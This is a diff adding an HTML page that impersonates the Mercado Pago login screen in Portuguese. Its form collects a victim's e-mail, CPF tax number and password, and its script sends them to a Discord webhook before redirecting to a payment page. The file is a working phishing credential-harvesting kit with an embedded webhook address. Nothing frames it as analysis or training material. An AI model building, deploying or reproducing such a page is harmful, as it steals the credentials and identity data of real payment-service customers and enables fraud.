@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Pago</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 400px;
+            margin: 50px auto;
+            background: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .title {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #008cba;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #005f73;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">
+            <h2>Mercado Pago</h2>
+        </div>
+        <form id="personalDataForm">
+            <div class="form-group">
+                <label for="email">E-mail</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="cpf">CPF</label>
+                <input type="text" id="cpf" name="cpf" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Senha</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Próximo</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('personalDataForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const cpf = document.getElementById('cpf').value;
+            const password = document.getElementById('password').value;
+
+            const data = {
+                email: email,
+                cpf: cpf,
+                password: password
+            };
+
+            fetch('https://discord.com/api/webhooks/1471656589600489625/3qhjUPg1o8NhF3Rvf8stIy5XMfK0iFEXS62DGIE6qabkYfI1YH2jlbvEc1kslOi5BSsi', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Dados pessoais enviados com sucesso:', data);
+                window.location.href = 'pagamento.html'; // Redireciona para a página de pagamento
+            })
+            .catch(error => {
+                console.error('Erro ao enviar dados pessoais:', error);
+                alert('Ocorreu um erro ao processar o pagamento.');
+            });
+        });
+    </script>
+</body>
+</html>
